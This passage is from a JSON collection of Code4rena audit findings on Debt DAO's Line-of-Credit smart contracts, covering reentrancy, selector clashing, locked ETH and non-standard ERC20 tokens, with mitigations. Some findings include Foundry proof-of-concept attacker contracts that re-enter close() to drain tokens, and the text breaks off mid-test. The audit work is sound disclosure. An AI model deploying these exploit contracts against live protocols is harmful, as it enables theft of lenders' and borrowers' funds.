      "summary": "\nThis bug report is about an issue with the Line-of-Credit contract on the Ethereum blockchain. The contract uses Solidity's `transfer()` function to withdraw and refund ETH. This function can cause issues when the withdrawer is a smart contract, as it may not be able to withdraw ETH deposits. This is because the withdrawer smart contract may not have a payable fallback function, or it may have one that uses more than 2300 gas units. The risks of reentrancy stemming from the use of this function can be mitigated by following the \"Check-Effects-Interactions\" pattern and using OpenZeppelin Contract’s ReentrancyGuard contract. It is recommended to use low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` instead.",
      "quality_score": 3.0003583740810145,
      "rarity_score": 1.001075122243043,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/369",
      "tags": [
        "call vs transfer"
      ],
      "finders": [
        "codexploder",
        "Nyx",
        "cryptonue",
        "Bnke0x0",
        "peanuts",
        "Ch_301",
        "pashov",
        "minhquanym",
        "joestakey",
        "KingNFT",
        "Amithuddar",
        "adriro",
        "Tomo",
        "d3e4",
        "IllIllI",
        "Deivitto",
        "cccz",
        "RaymondFam",
        "corerouter",
        "0xdeadbeef0x",
        "cloudjunky",
        "SmartSek",
        "8olidity",
        "__141345__",
        "datapunk",
        "martin",
        "RedOneN",
        "carlitox477",
        "merlin",
        "rvierdiiev",
        "Satyam_Sharma",
        "bananasboys"
      ]
    },
    {
      "id": "6249",
      "title": "[M-09] Variable balance ERC20 support",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L94-L96>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L75-L79>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L273-L280>\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L487-L493>\n\n### Impact\n\nSome ERC20 may be tricky for the balance. Such as:\n\n*   fee on transfer (STA, USDT also has this mode)\n*   rebasing (aToken from AAVE)\n*   variable balance (stETH, balance could go up and down)\n\nFor these tokens, the balance can change over time, even without `transfer()/transferFrom()`. But current accounting stores the spot balance of the asset.\n\nThe impacts include:\n\n*   the calculation of collateral value could be inaccurate\n*   protocol could lose funds due to the deposit/repay amount being less than the actual transferred amount after fee\n*   the amount user withdraw collateral when `_close()` will be inaccurate\n    *   some users could lose funds due to under value\n    *   some funds could be locked due to the balance inflation\n    *   some funds might be locked due to the balance deflation\n\n### Proof of Concept\n\nThe spot new deposit amount is stored in the mapping `self.deposited[token].amount` and `credit.deposit`, and later used to calculate the collateral value and withdraw amount.\n\n```solidity\n// Line-of-Credit/contracts/utils/EscrowLib.sol\n    function addCollateral(EscrowState storage self, address oracle, uint256 amount, address token) {\n        // ...\n        LineLib.receiveTokenOrETH(token, msg.sender, amount);\n\n        self.deposited[token].amount += amount;\n        // ...\n    }\n\n    function _getCollateralValue(EscrowState storage self, address oracle) public returns (uint256) {\n            // ...\n            d = self.deposited[token];\n                // ...\n                collateralValue += CreditLib.calculateValue(\n                  o.getLatestAnswer(d.asset),\n                  deposit,\n                  d.assetDecimals\n                );\n            // ...\n    }\n\n// Line-of-Credit/contracts/modules/credit/LineOfCredit.sol\n    function increaseCredit(bytes32 id, uint256 amount) {\n        // ...\n        Credit memory credit = credits[id];\n        credit = _accrue(credit, id);\n\n        credit.deposit += amount;\n        \n        credits[id] = credit;\n\n        LineLib.receiveTokenOrETH(credit.token, credit.lender, amount);\n\n        // ...\n    }\n\n    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n        // ...\n        if (credit.deposit + credit.interestRepaid > 0) {\n            LineLib.sendOutTokenOrETH(\n                credit.token,\n                credit.lender,\n                credit.deposit + credit.interestRepaid\n            );\n        }\n```\n\nHowever, if the balance changed later, the returned collateral value will be inaccurate. And the amount used when withdraw collateral in `_close()` is also wrong.\n\n### Recommended Mitigation Steps\n\n*   checking the before and after balance of token transfer\n*   recording the relative shares of each user instead of specific amount\n*   if necessary, call `ERC20(token).balanceOf()` to confirm the balance\n*   disallow such kind of tokens\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2022-11-debtdao-findings/issues/367#issuecomment-1319123709):**\n > This issue encompasses all 'non-standard' ERC20 tokens and their potential side effects within the system. Special mention for report [#350](https://github.com/code-423n4/2022-11-debtdao-findings/issues/350), which adds a case this report fails to capture.\n\n**[kibagateaux (Debt DAO) disputed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/367#issuecomment-1405076131)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with Lines of Code in the EscrowLib.sol and LineOfCredit.sol files of a project stored on GitHub. The issue is that some ERC20 tokens may be tricky for the balance, such as fee on transfer, rebasing, and variable balance. This could lead to inaccuracies in the calculation of collateral value, the protocol losing funds, and users losing funds due to undervalue or the balance inflation or deflation.\n\nThe proof of concept involves manual analysis of the code, which shows that the spot new deposit amount is stored in the mapping and later used to calculate the collateral value and withdraw amount. However, if the balance changed later, the returned collateral value will be inaccurate and the amount used when withdrawing collateral in `_close()` will also be wrong.\n\nRecommended mitigation steps include checking the before and after balance of token transfer, recording the relative shares of each user instead of specific amounts, calling `ERC20(token).balanceOf()` to confirm the balance, and disallowing such kind of tokens.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/367",
      "tags": [
        "Weird ERC20"
      ],
      "finders": [
        "pashov",
        "__141345__",
        "codexploder",
        "rbserver",
        "cccz",
        "Jeiwan",
        "minhquanym",
        "ladboy233",
        "Ruhum",
        "Lambda",
        "Bnke0x0",
        "hansfriese",
        "ayeslick",
        "Ch_301",
        "rvierdiiev",
        "aphak5010",
        "everyanykey"
      ]
    },
    {
      "id": "6248",
      "title": "[M-08] Mistakenly sent eth could be locked",
      "impact": "MEDIUM",
      "content": "\nIf ERC20 and eth are transferred at same time, the mistakenly sent eth will be locked.\n\nThere are several functions that could be affected and cause user fund lock:\n\n*   `addCollateral()`\n*   `addCredit()`\n*   `increaseCredit()`\n*   `depositAndClose()`\n*   `depositAndRepay()`\n*   `close()`\n\n### Proof of Concept\n\nIn `receiveTokenOrETH()`, different logic is used to handle ERC20 and eth transfer. However, in the ERC20 if block, mistakenly sent eth will be ignored. This part of eth will be locked in the contract.\n\n```solidity\n// Line-of-Credit/contracts/utils/LineLib.sol\n    function receiveTokenOrETH(\n      address token,\n      address sender,\n      uint256 amount\n    )\n      external\n      returns (bool)\n    {\n        if(token == address(0)) { revert TransferFailed(); }\n        if(token != Denominations.ETH) { // ERC20\n            IERC20(token).safeTransferFrom(sender, address(this), amount);\n        } else { // ETH\n            if(msg.value < amount) { revert TransferFailed(); }\n        }\n        return true;\n    }\n```\n\n### Recommended Mitigation Steps\n\nIn the ERC20 part, add check for `msg.value` to ensure no eth is sent:\n\n```solidity\n        if(token != Denominations.ETH) { // ERC20\n            if (msg.value > 0) { revert TransferFailed(); }\n            IERC20(token).safeTransferFrom(sender, address(this), amount);\n        } else { // ETH\n```\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/355#issuecomment-1405077581)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LineLib.sol contract from the Line-of-Credit repository. This vulnerability can cause user funds to be locked if ERC20 and Ether are sent at the same time. This affects several functions, including addCollateral(), addCredit(), increaseCredit(), depositAndClose(), depositAndRepay(), and close(). The bug was found by manual analysis. \n\nThe vulnerability is caused by different logic being used to handle ERC20 and Ether transfers in the receiveTokenOrETH() function. In the ERC20 if block, mistakenly sent Ether is ignored and locked in the contract. To mitigate this vulnerability, it is recommended to add a check for msg.value in the ERC20 part to ensure no Ether is sent.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/355",
      "tags": [
        "Refund Ether"
      ],
      "finders": [
        "__141345__",
        "datapunk",
        "rbserver",
        "0xbepresent",
        "bin2chen",
        "joestakey",
        "0xSmartContract",
        "cloudjunky",
        "Tomo",
        "aphak5010",
        "eierina"
      ]
    },
    {
      "id": "6247",
      "title": "[M-07] Whitelisted functions aren’t scoped to revenue contracts and may lead to unnoticed calls due to selector clashing",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L67\nhttps://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L14\n\n\n## Vulnerability details\n\nWhitelisted functions in the Spigot contract don't have any kind of association or validation to which revenue contract they are intended to be used. This may lead to inadvertently whitelisting a function in another revenue contract that has the same selector but a different name (signature).\n\n## Impact\n\nFunctions in Solidity are represented by the first 4 bytes of the keccak hash of the function signature (name + argument types). It is possible (and not difficult) to find different functions that have the same selector.\n\nIn this way, a bad actor can try to use an innocent looking function that matches the selector of another function (in a second revenue contract) that has malicious intentions. The arbiter will review the innocent function, whitelist its selector, while unknowingly enabling a potential call to the malicious function, since whitelisted functions can be called on any revenue contract. \n\nMining for selector clashing is feasible since selectors are 4 bytes and the search space isn't that big for current hardware.\n\nThis is similar to the attack found on proxies, documented here https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357 and here https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070\n\n## PoC\n\nIn the following test the `collate_propagate_storage(bytes16)` function is whitelisted because it looks safe enough to the arbiter. Now, `collate_propagate_storage(bytes16) ` has the same selector as `burn(uint256)`, which allows a bad actor to call `EvilRevenueContract.burn` using the `operate` function of the Spigot.\n\nNote: the context for this test (setup, variables and helper functions) is similar to the one found in the file `Spigot.t.sol`.\n\n```\ncontract InnocentRevenueContract {\n    function collate_propagate_storage(bytes16) external {\n        // It's all safe here!\n        console.log(\"Hey it's all good here\");\n    }\n}\n\ncontract EvilRevenueContract {\n    function burn(uint256) external {\n        // Burn the world!\n        console.log(\"Boom!\");\n    }\n}\n\nfunction test_WhitelistFunction_SelectorClash() public {\n      vm.startPrank(owner);\n      \n      spigot = new Spigot(owner, treasury, operator);\n      \n      // Arbiter looks at InnocentRevenueContract.collate_propagate_storage and thinks it's safe to whitelist it (this is a simplified version, in a real deploy this comes from the SpigotedLine contract)\n      spigot.updateWhitelistedFunction(InnocentRevenueContract.collate_propagate_storage.selector, true);\n      assertTrue(spigot.isWhitelisted(InnocentRevenueContract.collate_propagate_storage.selector));\n      \n      // Due to selector clashing EvilRevenueContract.burn gets whitelisted too!\n      assertTrue(spigot.isWhitelisted(EvilRevenueContract.burn.selector));\n      \n      \n      EvilRevenueContract evil = new EvilRevenueContract();\n      // ISpigot.Setting memory settings = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);\n      // require(spigot.addSpigot(address(evil), settings), \"Failed to add spigot\");\n      \n      vm.stopPrank();\n              \n      // And we can call it through operate...\n      vm.startPrank(operator);\n      spigot.operate(address(evil), abi.encodeWithSelector(EvilRevenueContract.burn.selector, type(uint256).max));\n  }\n```\n\n## Recommendation\n\nAssociate whitelisted functions to particular revenue contracts (for example, using a `mapping(address => mapping(bytes4 => bool))`) and validate that the selector for the call is enabled for that specific revenue contract in the `operate` function.",
      "summary": "\nThis bug report is about whitelisted functions in the Spigot contract not having any kind of association or validation to which revenue contract they are intended to be used. This could lead to a malicious actor being able to call a potentially dangerous function using the selector of an innocent function. This is because functions in Solidity are represented by the first 4 bytes of the keccak hash of the function signature, and it is possible to find different functions that have the same selector. Mining for selector clashing is feasible since selectors are 4 bytes and the search space isn't that big for current hardware.\n\nTo prevent this, the report recommends that the whitelisted functions should be associated to particular revenue contracts and validated that the selector for the call is enabled for that specific revenue contract in the `operate` function.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/312",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Jeiwan",
        "bin2chen",
        "Ruhum",
        "berndartmueller",
        "adriro",
        "rvierdiiev"
      ]
    },
    {
      "id": "6246",
      "title": "[M-06] The lender can draw out extra credit token from borrower’s account",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488\n\n\n## Vulnerability details\n\n## Impact\nWhen the credit token is ERC20 extensive with hook, such as ERC777 token, the lender can exploit it to draw out extra tokens from borrower's account. And the 'count' state variable would also be underflowed, cause the line contract can't be 'REPAID', the borrower will never be able to get back the collateral.\n\nP.S.\nSimilar attack on imBTC https://zengo.com/imbtc-defi-hack-explained/\n\n## Proof of Concept\nThe vulnerable point is in '_close()' function,\n```\nfunction _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n    // ...\n    if (credit.deposit + credit.interestRepaid > 0) {\n        LineLib.sendOutTokenOrETH( // @audit reentrancy attack from here\n            credit.token,\n            credit.lender,\n            credit.deposit + credit.interestRepaid\n        );\n    }\n    // ...\n}\n```\n\nThe  following testcase shows how to exploit it, put it into a new LenderExploit.t.sol file under 'test' directory, it will pass\n```\npragma solidity 0.8.9;\n\nimport \"forge-std/Test.sol\";\nimport { Denominations } from \"chainlink/Denominations.sol\";\nimport { Address } from \"openzeppelin/utils/Address.sol\";\n\nimport { Spigot } from \"../modules/spigot/Spigot.sol\";\nimport { Escrow } from \"../modules/escrow/Escrow.sol\";\nimport { SecuredLine } from \"../modules/credit/SecuredLine.sol\";\nimport { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\nimport { ISecuredLine } from \"../interfaces/ISecuredLine.sol\";\n\nimport { LineLib } from \"../utils/LineLib.sol\";\nimport { MutualConsent } from \"../utils/MutualConsent.sol\";\n\nimport { MockLine } from \"../mock/MockLine.sol\";\nimport { SimpleOracle } from \"../mock/SimpleOracle.sol\";\nimport { RevenueToken } from \"../mock/RevenueToken.sol\";\n\n\ninterface IHook {\n    function tokensReceived(\n        address from,\n        address to,\n        uint256 amount\n    ) external;\n}\n\ncontract RevenueTokenWithHook is RevenueToken {\n    using Address for address;\n    mapping(address => bool) public registry;\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        super._afterTokenTransfer(from, to, amount);\n        if (registry[to]) {\n            IHook(to).tokensReceived(from, to, amount);\n        }\n    }\n\n    function registerHook(address addr) external {\n        registry[addr] = true;\n    }\n}\n\ncontract Attacker is IHook {\n    uint256 constant ATTACK_COUNT = 10;\n    SecuredLine line;\n    address borrower;\n    RevenueTokenWithHook token;\n    uint256 count;\n    bool attackEnable;\n    constructor(address line_, address borrower_, address token_) {\n        line = SecuredLine(payable(line_));\n        borrower = borrower_;\n        token = RevenueTokenWithHook(token_);\n        token.registerHook(address(this));\n    }\n    function tokensReceived(\n            address,\n            address,\n            uint256\n        ) external {\n        if (msg.sender != address(token)) return;\n        if (!attackEnable) return;\n        uint256 count_ = count;\n        if (count_ >= ATTACK_COUNT) return;\n        count = count_ + 1;\n        bytes32 id = line.ids(0);\n        (uint256 deposit,,,,,,) = line.credits(id);\n        token.transfer(address(line), deposit);\n        line.close(id);\n    }\n\n    function enableAttack() external {\n        attackEnable = true;\n    }\n}\n\n\ncontract ExploitCloseFunctionTest is Test {\n    uint256 constant ONE_YEAR = 365.25 days;\n    uint256 constant ATTACK_COUNT = 10;\n    Escrow escrow;\n    Spigot spigot;\n    RevenueTokenWithHook supportedToken1;\n    RevenueToken supportedToken2;\n    RevenueToken unsupportedToken;\n    SimpleOracle oracle;\n    SecuredLine line;\n    uint mintAmount = 100 ether;\n    uint MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n    uint32 minCollateralRatio = 10000; // 100%\n    uint128 dRate = 100;\n    uint128 fRate = 1;\n    uint ttl = ONE_YEAR;\n\n    address borrower;\n    address arbiter;\n    address lender;\n\n    function setUp() public {\n        borrower = address(20);\n        arbiter = address(this);\n        supportedToken1 = new RevenueTokenWithHook();\n        supportedToken2 = new RevenueToken();\n        unsupportedToken = new RevenueToken();\n\n        spigot = new Spigot(arbiter, borrower, borrower);\n        oracle = new SimpleOracle(address(supportedToken1), address(supportedToken2));\n\n        escrow = new Escrow(minCollateralRatio, address(oracle), arbiter, borrower);\n\n        line = new SecuredLine(\n          address(oracle),\n          arbiter,\n          borrower,\n          payable(address(0)),\n          address(spigot),\n          address(escrow),\n          ONE_YEAR,\n          0\n        );\n        lender = address(new Attacker(address(line), borrower, address(supportedToken1)));\n        assertEq(supportedToken1.registry(lender), true);\n        \n        escrow.updateLine(address(line));\n        spigot.updateOwner(address(line));\n        \n        assertEq(uint(line.init()), uint(LineLib.STATUS.ACTIVE));\n\n        _mintAndApprove();\n        escrow.enableCollateral( address(supportedToken1));\n        escrow.enableCollateral( address(supportedToken2));\n   \n        vm.startPrank(borrower);\n        escrow.addCollateral(1 ether, address(supportedToken2));\n        vm.stopPrank();\n    }\n\n    function testExpoit() public {\n        _addCredit(address(supportedToken1), 1 ether);\n        bytes32 id = line.ids(0);\n        vm.warp(line.deadline() - ttl / 2);\n        line.accrueInterest();\n        (uint256 deposit, , uint256 interestAccrued, , , , ) = line.credits(id);\n        uint256 lenderBalanceBefore = supportedToken1.balanceOf(lender);\n        uint256 lenderBalanceAfterExpected = lenderBalanceBefore + deposit + interestAccrued;\n\n        Attacker(lender).enableAttack();\n        hoax(lender);\n        line.close(id);\n        vm.stopPrank();\n        uint256 lenderBalanceAfter = supportedToken1.balanceOf(lender);\n        assertEq(lenderBalanceAfter, lenderBalanceAfterExpected + interestAccrued * ATTACK_COUNT);\n        (uint256 count,) = line.counts();\n        assertEq(count, MAX_INT - ATTACK_COUNT + 1);\n    }\n\n\n    function _mintAndApprove() internal {\n        deal(lender, mintAmount);\n\n        supportedToken1.mint(borrower, mintAmount);\n        supportedToken1.mint(lender, mintAmount);\n        supportedToken2.mint(borrower, mintAmount);\n        supportedToken2.mint(lender, mintAmount);\n        unsupportedToken.mint(borrower, mintAmount);\n        unsupportedToken.mint(lender, mintAmount);\n\n        vm.startPrank(borrower);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n        vm.startPrank(lender);\n        supportedToken1.approve(address(escrow), MAX_INT);\n        supportedToken1.approve(address(line), MAX_INT);\n        supportedToken2.approve(address(escrow), MAX_INT);\n        supportedToken2.approve(address(line), MAX_INT);\n        unsupportedToken.approve(address(escrow), MAX_INT);\n        unsupportedToken.approve(address(line), MAX_INT);\n        vm.stopPrank();\n\n    }\n\n    function _addCredit(address token, uint256 amount) public {\n        hoax(borrower);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n        hoax(lender);\n        line.addCredit(dRate, fRate, amount, token, lender);\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n\n```\n\nRelated links:\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L173\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nAdd reentrancy protection on 'close()' function.",
      "summary": "\nThis bug report is about a vulnerability found in the LineOfCredit.sol contract, which is part of the Line-of-Credit project. The vulnerability allows the lender to exploit it to draw out extra tokens from borrower's account when the credit token is ERC20 extensive with hook, such as ERC777 token. As a result, the 'count' state variable would also be underflowed, causing the line contract to be unable to be 'REPAID', and the borrower would never be able to get back the collateral. This is similar to an attack on imBTC.\n\nA proof of concept code was provided in the report, which shows how to exploit the vulnerability. The vulnerable point is in the '_close()' function, where there is no reentrancy protection.\n\nThe recommended mitigation step is to add reentrancy protection on the 'close()' function. The tools used to find the vulnerability is VS Code.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/176",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "adriro",
        "Ch_301",
        "KingNFT",
        "__141345__"
      ]
    },
    {
      "id": "6245",
      "title": "[M-05] Reentrancy bug allows lender to steal other lenders funds",
      "impact": "MEDIUM",
      "content": "\nA reentrancy bug in `LineOfCredit.sol` allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds).\n\nThe  reentrancy occurs in the `_close(credit, id)` function in `LineOfCredit.sol`. The `credit[id]` state variable is cleared only after sendings tokens to the lender.\n\n<https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483>\n\n        function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n            if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n            // return the Lender's funds that are being repaid\n            if (credit.deposit + credit.interestRepaid > 0) {\n                LineLib.sendOutTokenOrETH(\n                    credit.token,\n                    credit.lender,\n                    credit.deposit + credit.interestRepaid\n                );\n            }\n\n            delete credits[id]; // gas refunds\n\n            // remove from active list\n            ids.removePosition(id);\n            unchecked { --count; }\n\n            // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n            if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n            emit CloseCreditPosition(id);\n\n            return true;\n        }\n\n### Proof of Concept\n\nReentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions.\nExample of a real-world popular token that can change control flow is PNT (pNetwork).\n\nAs the protocol supports any token listed on the oracle, if the oracle currently supports (or will support in the future) a feed of the above tokens, the bug is exploitable.\n\nIf a reentrancy occurs in the `_close(credit, id)` function, the `credit[id]` state variable is cleared only after sendings tokens to the lender.\nA lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`. A lender can repeat these processes as long as LineOfCredit has funds available.\n\nThe POC will demonstrate the following flow:\n\n1.  Borrower  adds a new credit with lender1 on 1000 tokens.\n2.  Borrower lends 1000 from lender1\n3.  Borrower repays debt\n4.  Borrower adds a new credit with lender2 on 1000 tokens\n5.  Borrower closes debt with lender1\n6.  Lender1 receives 2000 tokens.\n\nAdd the `MockLender.sol` to mock folder.\n\n    pragma solidity 0.8.9;\n\n    import { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\n    import { Token777 } from \"./Token777.sol\";\n\n    contract MockLender {\n        address owner;\n        ILineOfCredit line;\n        bytes32 id;\n        bool lock;\n        \n        event GotMoney(uint256 amount);\n\n        constructor(address _line) public {\n            line = ILineOfCredit(_line);\n            owner = msg.sender;\n        }\n\n        function addCredit(\n            uint128 drate,\n            uint128 frate,\n            uint256 amount,\n            address token\n        ) external {\n            require(msg.sender == owner, \"Only callable by owner\");\n            Token777(token).approve(address(line), amount);\n            Token777(token).approve(address(owner), type(uint256).max);\n            Token777(token).mockAddToRegistry();\n            id = line.addCredit(drate, frate, amount, token, address(this));\n        }\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n            emit GotMoney(amount);\n            if(!lock){\n                lock = true;\n                line.close(id);\n            }\n        }\n\n        receive() external payable {\n        }\n\n    }\n\nAdd `Token777.sol` to mocks folder:\n\n    pragma solidity 0.8.9;\n\n    import \"openzeppelin/token/ERC20/ERC20.sol\";\n    interface IERC777Recipient {\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external;\n    }\n\n    contract Token777 is ERC20(\"Token used to trade\", \"777\") {\n        mapping(address => uint256) private _balances;\n        mapping(address => address) private registry;\n        uint256 private _totalSupply;\n\n        string private _name;\n        string private _symbol;\n\n        // ERC20-allowances\n        mapping(address => mapping(address => uint256)) private _allowances;\n\n        event Test(address);\n\n        constructor() {\n        }\n\n        function mint(address account, uint256 amount) external returns(bool) {\n            _mint(account, amount);\n            return true;\n        }\n\n        function _mint(\n            address account,\n            uint256 amount\n        ) internal virtual override{\n            require(account != address(0), \"ERC777: mint to the zero address\");\n\n            // Update state variables\n            _totalSupply += amount;\n            _balances[account] += amount;\n            emit Test(account);\n        }\n        function balanceOf(address account) public view virtual override returns (uint256) {\n            return _balances[account];\n        }\n\n        function approve(address spender, uint256 value) public virtual override returns (bool) {\n            address holder = _msgSender();\n            _approve(holder, spender, value);\n            return true;\n        }\n       function _approve(\n            address holder,\n            address spender,\n            uint256 value\n        ) internal  virtual override {\n            require(holder != address(0), \"ERC777: approve from the zero address\");\n            require(spender != address(0), \"ERC777: approve to the zero address\");\n\n            _allowances[holder][spender] = value;\n            emit Approval(holder, spender, value);\n        }\n        function transferFrom(\n            address holder,\n            address recipient,\n            uint256 amount\n        ) public virtual override returns (bool) {\n            address spender = _msgSender();\n            emit Test(msg.sender);\n            _spendAllowance(holder, spender, amount);\n            _send(holder, recipient, amount, \"\", \"\", false);\n            return true;\n        }\n\n        function allowance(address holder, address spender) public view virtual override returns (uint256) {\n            return _allowances[holder][spender];\n        }\n        function _spendAllowance(\n            address owner,\n            address spender,\n            uint256 amount\n        ) internal override virtual {\n            emit Test(msg.sender);\n            uint256 currentAllowance = allowance(owner, spender);\n            if (currentAllowance != type(uint256).max) {\n                require(currentAllowance >= amount, \"ERC777: insufficient allowance\");\n                unchecked {\n                    _approve(owner, spender, currentAllowance - amount);\n                }\n            }\n        }\n\n        function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n            _send(_msgSender(), recipient, amount, \"\", \"\", false);\n            return true;\n        }\n\n        function _send(\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) internal virtual {\n            require(from != address(0), \"ERC777: transfer from the zero address\");\n            require(to != address(0), \"ERC777: transfer to the zero address\");\n\n            address operator = _msgSender();\n\n            _move(operator, from, to, amount, userData, operatorData);\n\n            _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);\n        }\n\n\n        function _move(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData\n        ) private {\n            uint256 fromBalance = _balances[from];\n            require(fromBalance >= amount, \"ERC777: transfer amount exceeds balance\");\n            unchecked {\n                _balances[from] = fromBalance - amount;\n            }\n            _balances[to] += amount;\n        }\n\n        function _callTokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) private {\n            address implementer = registry[to];\n            if (implementer != address(0)) {\n                IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);\n            }\n        }\n\n        function mockAddToRegistry() external {\n            registry[msg.sender] = msg.sender;\n        }\n\n    }\n\nAdd the following imports to `LineOfCredit.t.sol`:\n\n    import { MockLender } from \"../mock/MockLender.sol\";\n    import { Token777 } from \"../mock/Token777.sol\";\n\nAdd the following test to `LineOfCredit.t.sol`:\n\n```\n\n    function test_reentrancy() public {\n        uint256 lenderOneAmount = 1000;\n        uint256 lenderTwoAmount = 1000;\n        Token777 tokenUsed = new Token777();\n        // Create lenderController \n        address lenderOneController = address(0xdeadbeef);\n        address lender2 = address(0x1337);\n\n        // Create lenderContract \n        vm.startPrank(lenderOneController);\n        MockLender lenderOneContract = new MockLender(address(line));\n        vm.stopPrank();\n\n        // give lenders their lend amount of token\n        tokenUsed.mint(address(lenderOneContract), lenderOneAmount);\n        tokenUsed.mint(address(lender2), lenderTwoAmount);\n\n        // add support of the token to the SimpleOracle\n        oracle.changePrice(address(tokenUsed), 1000 * 1e8); // 1000 USD\n\n        // Borrowers adds credit line from lender2\n        vm.startPrank(borrower);\n        line.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed), address(lenderOneContract));\n        vm.stopPrank();\n\n        // LenderOne adds credit line\n        vm.startPrank(lenderOneController);\n        lenderOneContract.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed));\n        vm.stopPrank();\n\n        //borrow 1 ether\n        bytes32 id_first = line.ids(0);\n        vm.startPrank(borrower);\n        